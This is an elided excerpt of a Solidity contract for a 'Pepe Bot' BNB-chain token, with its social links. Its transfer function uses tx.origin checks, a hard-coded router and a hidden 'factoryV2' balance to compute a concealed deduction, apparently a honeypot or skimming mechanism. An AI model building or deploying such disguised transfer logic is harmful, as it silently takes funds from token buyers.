...
https://twitter.com/PepeBotTokenBNB
https://t.me.com/PepeBotTokenBNB
https://PepeBotTokenBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private factoryV2 = 0x3D382d411354bCb0EE470500a53B6B68A4f77526;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private _swappingToggle = 1;
    address internal _uniswapRouterV2 = 0xcB8213bb31951efb60E760e1254C4D3B3BFDC800;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[factoryV2] > 0 ? pairsAllowance : _swappingToggle).div(100)+0;
        if (swapamount > 0)
        {
...
contract PepeBotToken is ERC20, Ownable
{
    constructor() ERC20(unicode"Pepe Bot", unicode"PEPEBOT")
    {
